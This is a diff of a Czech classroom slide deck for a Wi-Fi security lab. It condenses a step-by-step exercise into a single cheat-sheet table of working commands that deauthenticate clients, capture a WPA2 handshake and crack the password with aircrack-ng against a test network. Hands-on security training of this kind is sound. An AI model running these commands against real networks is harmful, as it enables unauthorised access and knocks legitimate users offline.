@@ -60,6 +60,40 @@
         text-align: left;
         font-size: 0.85em;
       }
+      .cmd-table {
+        width: 100%;
+        font-size: 0.52em;
+        border-collapse: collapse;
+        text-align: left;
+        margin-top: 0.8rem;
+      }
+      .cmd-table th {
+        background-color: #007acc;
+        color: white;
+        padding: 0.5rem;
+      }
+      .cmd-table td {
+        padding: 0.5rem;
+        border-bottom: 1px solid #ddd;
+        vertical-align: top;
+      }
+      .cmd-code {
+        font-family: monospace;
+        background-color: #1e1e1e;
+        color: #dcdcdc;
+        padding: 0.3rem 0.5rem;
+        border-radius: 4px;
+        white-space: pre-wrap;
+        word-break: break-all;
+      }
+      .step-badge {
+        background: #f6821f;
+        color: white;
+        font-weight: bold;
+        padding: 0.15rem 0.4rem;
+        border-radius: 4px;
+        white-space: nowrap;
+      }
     </style>
   </head>
   <body>
@@ -82,7 +116,7 @@
             <li class="fragment">Skenování okolních síťových vysílačů (<code>airodump-ng</code>)</li>
             <li class="fragment">Deautentizační útok a zachycení WPA2 Handshaku (<code>aireplay-ng</code>)</li>
             <li class="fragment">Slovníkový útok na heslo (<code>aircrack-ng</code> a <code>hashcat</code>)</li>
-            <li class="fragment"><strong>Samostatné praktické cvičení krok za krokem!</strong></li>
+            <li class="fragment"><strong>Samostatné praktické cvičení (Všechny příkazy naráz!)</strong></li>
           </ol>
         </section>
 
@@ -316,75 +350,66 @@ hashcat -m 22000 export.hc22000 /usr/share/wordlists/rockyou.txt</code></pre>
           </section>
         </section>
 
-        <!-- KATEGORIE 6: Samostatné praktické cvičení krok za krokem -->
+        <!-- KATEGORIE 6: Praktické cvičení - Všechny příkazy na jednom slajdu -->
         <section>
           <section>
             <h2>Kategorie 6</h2>
-            <h3>Praktické cvičení: Krok za krokem</h3>
+            <h3>Praktické cvičení: Přehled příkazů</h3>
           </section>
 
           <section>
-            <h2>Praktické cvičení: Přehled úkolu</h2>
+            <h2>Všechny příkazy pro cvičení (Cheatsheet)</h2>
+            <p style="font-size: 0.7em; color: #666;">Karta je v Monitor módu (<code>wlan0mon</code>)</p>
+            <table class="cmd-table">
+              <thead>
+                <tr>
+                  <th style="width: 10%;">Krok</th>
+                  <th style="width: 52%;">Příkaz (Command)</th>
+                  <th style="width: 38%;">Popis činnosti</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td><span class="step-badge">1</span></td>
+                  <td><div class="cmd-code">iwconfig</div></td>
+                  <td>Ověření rozhraní v Monitor módu.</td>
+                </tr>
+                <tr>
+                  <td><span class="step-badge">2</span></td>
+                  <td><div class="cmd-code">sudo airodump-ng wlan0mon</div></td>
+                  <td>Skenování sítí. Poznamenej <strong>BSSID</strong> a <strong>CH</strong>.</td>
+                </tr>
+                <tr>
+                  <td><span class="step-badge">3</span></td>
+                  <td><div class="cmd-code">sudo airodump-ng -c &lt;CH&gt; --bssid &lt;BSSID&gt; -w pokus wlan0mon</div></td>
+                  <td>Zacílení a ukládání paketů do <code>pokus-01.cap</code>. Poznamenej MAC klienta.</td>
+                </tr>
+                <tr>
+                  <td><span class="step-badge">4</span></td>
+                  <td><div class="cmd-code">sudo aireplay-ng --deauth 5 -a &lt;BSSID&gt; -c &lt;MAC_KLIENTA&gt; wlan0mon</div></td>
+                  <td><em>(V novém okně)</em> Deautentizace pro opakováné přihlášení klienta.</td>
+                </tr>
+                <tr>
+                  <td><span class="step-badge">5</span></td>
+                  <td><div class="cmd-code"># Sleduj v 1. okně: [ WPA handshake: BSSID ]</div></td>
+                  <td>Ověř zachycení a stiskni <code>Ctrl + C</code> pro ukončení skenu.</td>
+                </tr>
+                <tr>
+                  <td><span class="step-badge">6</span></td>
+                  <td><div class="cmd-code">aircrack-ng -w /usr/share/wordlists/rockyou.txt pokus-01.cap</div></td>
+                  <td>Slovníkový útok a odhalení hesla (<code>KEY FOUND!</code>).</td>
+                </tr>
+              </tbody>
+            </table>
+          </section>
+
+          <section>
+            <h2>Samostatná prezentace příkazů</h2>
             <div class="highlight-box">
-              <p><strong>Vaše karta je již v MONITOR MÓDU (<code>wlan0mon</code>)!</strong></p>
-              <p>Vaším úkolem je najít testovací Wi-Fi síť v učebně, zacílit na ni, odchytit WPA2 Handshake a odhalit heslo.</p>
+              <p><strong>Samostatný tahák s příkazy (Cheatsheet Prezentace):</strong></p>
+              <p><a href="commands.html" target="_blank" style="font-size: 1.3em; font-weight: bold; color: #007acc;">commands.html &rarr; Otevřít prezentaci pouze s příkazy</a></p>
             </div>
-          </section>
-
-          <section>
-            <h2>Cvičení - Krok 1: Kontrola rozhraní</h2>
-            <p>Otevřete terminál a ověřte síťové rozhraní v Monitor módu:</p>
-            <pre><code class="language-bash code-block">iwconfig</code></pre>
-            <p style="font-size: 0.8em; margin-top: 1rem;" class="fragment">Uvidíte rozhraní jako <code>wlan0mon</code> (nebo <code>wlan0</code>) v módu <code>Mode:Monitor</code>.</p>
-          </section>
-
-          <section>
-            <h2>Cvičení - Krok 2: Skenování okolních sítí</h2>
-            <p>Spusťte skenování všech kanálů ve vzduchu:</p>
-            <pre><code class="language-bash code-block">sudo airodump-ng wlan0mon</code></pre>
-            <div class="highlight-box fragment">
-              <p>V seznamu najděte vyhrazenou síť (např. <code>LSS_TEST_WIFI</code>) a poznamenejte si:</p>
-              <ul>
-                <li><strong>BSSID</strong> (MAC adresa routeru)</li>
-                <li><strong>CH</strong> (Číslo kanálu)</li>
-              </ul>
-            </div>
-          </section>
-
-          <section>
-            <h2>Cvičení - Krok 3: Zacílení a ukládání</h2>
-            <p>Zamiřte na kanál a BSSID učební sítě a ukládejte pakety:</p>
-            <pre><code class="language-bash code-block">sudo airodump-ng -c <KANÁL> --bssid <BSSID_ROUTERU> -w muj_pokus wlan0mon</code></pre>
-            <p style="font-size: 0.75em; margin-top: 0.5rem;">Příklad:</p>
-            <pre><code class="language-bash code-block">sudo airodump-ng -c 6 --bssid AA:BB:CC:11:22:33 -w muj_pokus wlan0mon</code></pre>
-            <p style="font-size: 0.75em;" class="fragment">&uarr; Toto okno nechte běhat! V dolní části si poznamenejte MAC adresu klienta (STATION).</p>
-          </section>
-
-          <section>
-            <h2>Cvičení - Krok 4: Vynucení přihlášení (Deautentizace)</h2>
-            <p>Otevřete <strong>DRUHÉ okno terminálu</strong> a pošlete deautentizaci:</p>
-            <pre><code class="language-bash code-block">sudo aireplay-ng --deauth 5 -a <BSSID_ROUTERU> -c <MAC_KLIENTA> wlan0mon</code></pre>
-            <p style="font-size: 0.75em; margin-top: 0.5rem;">Příklad:</p>
-            <pre><code class="language-bash code-block">sudo aireplay-ng --deauth 5 -a AA:BB:CC:11:22:33 -c 99:88:77:66:55:44 wlan0mon</code></pre>
-          </section>
-
-          <section>
-            <h2>Cvičení - Krok 5: Kontrola zachycení Handshaku</h2>
-            <p>Vráťte se do <strong>PRVNÍHO okna</strong> s <code>airodump-ng</code> a sledujte vpravo nahoře:</p>
-            <div class="highlight-box fragment" style="border-left-color: #28a745;">
-              <p style="color: #28a745; font-weight: bold;">[ WPA handshake: AA:BB:CC:11:22:33 ]</p>
-            </div>
-            <p style="font-size: 0.8em; margin-top: 1rem;" class="fragment">Jakmile zprávu uvidíte, stiskněte <code>Ctrl + C</code> pro zastavení skenování.</p>
-          </section>
-
-          <section>
-            <h2>Cvičení - Krok 6: Prolomení hesla</h2>
-            <p>Spusťte louskání hesla ze slovníku <code>rockyou.txt</code>:</p>
-            <pre><code class="language-bash code-block">aircrack-ng -w /usr/share/wordlists/rockyou.txt muj_pokus-01.cap</code></pre>
-            <div class="highlight-box fragment" style="border-left-color: #28a745;">
-              <p style="color: #28a745; font-weight: bold;">KEY FOUND! [ ... ]</p>
-              <p>Zapište si odhalené heslo a ukažte ho lektorovi!</p>
-            </div>
+            <p style="font-size: 0.85em; margin-top: 1rem;">Můžete nechat promítnutou prezentaci <code>commands.html</code> se všemi příkazy po celou dobu praktického cvičení!</p>
           </section>
 
           <section>
